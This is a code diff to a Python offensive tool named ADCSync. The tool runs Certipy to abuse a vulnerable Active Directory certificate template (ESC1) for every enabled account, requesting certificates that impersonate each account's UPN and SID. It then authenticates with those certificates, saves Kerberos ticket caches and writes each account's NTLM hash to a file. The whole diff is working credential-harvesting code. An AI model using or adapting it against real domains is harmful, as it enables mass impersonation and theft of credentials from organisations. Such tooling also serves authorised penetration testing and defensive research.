@@ -62,6 +62,7 @@ class AccountInfo:
     username: str
     usernameLower: str
     pfx_filepath: str = ''
+    ccache_filepath: str = ''
 
 @dataclass
 class AccountList:
@@ -107,11 +108,11 @@ def extract_accounts(data):
     logger.success(f"✅ Found {len(accounts.accounts)} enabled accounts.")
     return accounts
 
-def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, debug):
+def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output_file, debug):
     """Retrieve certificates using Certipy."""
     logger.info(f"🔄 Retrieving certificates for {len(accounts.accounts)} accounts...")
 
-    def fetch_cert(account):
+    def fetch_cert_and_auth(account):
         upn = f"'{account.spn}'"
         sid = f"'{account.sid}'"
         if proxychains:
@@ -124,57 +125,51 @@ def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, tar
                 certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                   '-template', template, '-upn', upn, '-sid', sid
             ]
-        process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        if "Failed to connect" in process.stdout:
+        req_process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        if "Failed to connect" in req_process.stdout:
             logger.error(f"⏳ Connection failed for account: {account.usernameLower}")
             return None
         
         # Move the generated .pfx file to the "certificates" folder if it exists
-        for filename in os.listdir('.'):
-            if filename.endswith('.pfx') and filename.startswith(account.usernameLower):
-                destination = os.path.join(certificates_folder, filename)
+        for pfx_filename in os.listdir('.'):
+            if pfx_filename.endswith('.pfx') and pfx_filename.startswith(account.usernameLower):
+                destination = os.path.join(certificates_folder, pfx_filename)
                 account.pfx_filepath = destination
-                shutil.move(filename, destination)
-
-        return account, process.stdout, process.stderr
-
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        futures = {executor.submit(fetch_cert, account): account for account in accounts.accounts}
-        for future in tqdm(as_completed(futures), total=len(futures), desc="Retrieving Certificates"):
-            result = future.result()
-            if result:
-                account, stdout, stderr = result
-                if debug:
-                    logging.debug(f"[Cert Fetch] {account.username} | {stdout.strip()} | {stderr.strip()}")
-
-def authenticate_accounts(accounts, dc_ip, proxychains, output_file):
-    """Authenticate using retrieved certificates."""
-
-    def auth_account(account):
+                shutil.move(pfx_filename, destination)
+        
         if not account.pfx_filepath.endswith('.pfx'):
             return None
         if proxychains:
             command = ['proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
         else:
             command = [certipy_client, 'auth', '-pfx', account.pfx_filepath,  '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        stdout, stderr = process.communicate()
-        return account, stdout.strip()
+        auth_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        stdout, stderr = auth_process.communicate()
+
+        # Move the generated .ccache file to the "caches" folder if it exists
+        for ccache_filename in os.listdir('.'):
+            if ccache_filename.endswith('.ccache') and ccache_filename.startswith(account.usernameLower):
+                ccache_destination = os.path.join(caches_folder, ccache_filename)
+                account.ccache_filepath = ccache_destination
+                shutil.move(ccache_filename, ccache_destination)
+        return account, stdout.strip(), stderr.strip()
 
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        futures = {executor.submit(auth_account, account): account for account in accounts.accounts}
+        futures = {executor.submit(fetch_cert_and_auth, account): account for account in accounts.accounts}
         with open(output_file, 'a') as out_file:
-            for future in tqdm(as_completed(futures), total=len(futures), desc="Authenticating"):
+            for future in tqdm(as_completed(futures), total=len(futures), desc="Retrieving Certs and Auth ESC1"):
                 result = future.result()
                 if result:
-                    account, output = result
-                    if output:
+                    account, stdout, stderr = result
+                    if debug:
+                        logging.debug(f"[Cert Fetch] {account.username} | {stdout} | {stderr}")
+                    if stdout:
                         try:
-                            ntlm_hash = output.split('\n')[-1].split(': ')[1]
+                            ntlm_hash = stdout.split('\n')[-1].split(': ')[1]
                             out_file.write(f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n')
                             logger.success(f"🔑 Successfully authenticated {account.username} - NTLM Hash stored")
                         except IndexError:
-                            logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {output}")
+                            logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {stdout}")
 
 def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains):
     """Main function to extract accounts, retrieve certificates, and authenticate."""
@@ -182,9 +177,7 @@ def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target
     data = get_json_data(file)
     accounts = extract_accounts(data)
 
-    retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, debug)
-
-    authenticate_accounts(accounts, dc_ip, proxychains, output)
+    retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output, debug)
 
     logger.success("🎉 ADCSync process completed successfully!")
 
